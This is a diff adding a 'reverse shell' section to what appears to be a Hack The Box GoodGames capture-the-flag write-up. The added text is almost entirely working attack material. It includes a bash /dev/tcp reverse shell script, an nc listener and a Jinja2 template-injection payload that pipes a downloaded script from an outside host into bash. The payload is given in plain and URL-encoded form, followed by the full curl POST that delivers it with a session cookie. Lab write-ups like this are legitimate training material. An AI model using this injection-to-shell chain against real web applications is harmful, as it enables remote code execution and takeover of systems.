@@ -1060,3 +1060,41 @@ lrwxrwxrwx 1 root root    9 Nov  5  2021 .bash_history -&gt; /dev/null
 drwx------ 3 root root 4096 Nov  5  2021 .cache
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
 ```
+
+** Exploiting to a reverse shell **
+Host a file containing the callback:
+```
+[  4:30PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data/payloads ]
+ $ cat revershell 
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"%                                                                                                                                                                                                        
+[  4:30PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data/payloads ]
+ $ python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+Now start up a listener to catch the callback
+```
+[  4:30PM ]  [ ops@redteam:~/Documents/PT/HTB ]
+ $ rlwrap nc -lnvp 9001
+listening on [any] 9001 ...
+```
+Encode the callback using URL Encoding
+Callback (unencoded)
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.6:8000/revershell | bash').read()}}
+```
+Callback (encoded)
+```
+%7b%7b%72%65%71%75%65%73%74%2e%61%70%70%6c%69%63%61%74%69%6f%6e%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%36%3a%38%30%30%30%2f%72%65%76%65%72%73%68%65%6c%6c%20%7c%20%62%61%73%68%27%29%2e%72%65%61%64%28%29%7d%7d
+```
+Curl command utilizing encoded callback
+```
+curl -i -s -k -X $'POST' \
+    -H $'Host: internal-administration.goodgames.htb' -H $'Content-Length: 365' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://internal-administration.goodgames.htb' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://internal-administration.goodgames.htb/settings' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    -b $'session=.eJwljktOBDEMBe-SNYvEv3bmMi3bsQVCAql7ZoW4O5HY1avNq5921pX3e3s8r1e-tfNjtUc7oFwhMNyS6xiEBrS8V1-91EthBKuWqIrV4tU5aXiSibp4hjvYqo6aIMAsmgtr4xDuAGO6TRp4IHkcyTi4z-qCpsmzitoOed15_deMPeO-6nx-f-bXFgyYSNOiA6VWHNNFtOY-97moAiyWD2u_fzwQQBA.Y6yIMg.JLNfPtFg1GrUQOZWAzokl8xXdEY' \
+    --data-binary $'name=%7b%7b%72%65%71%75%65%73%74%2e%61%70%70%6c%69%63%61%74%69%6f%6e%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%2e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%36%3a%38%30%30%30%2f%72%65%76%65%72%73%68%65%6c%6c%20%7c%20%62%61%73%68%27%29%2e%72%65%61%64%28%29%7d%7d' \
+    $'http://internal-administration.goodgames.htb/settings'
+```
+
+Catch the shell and enjoy!
+
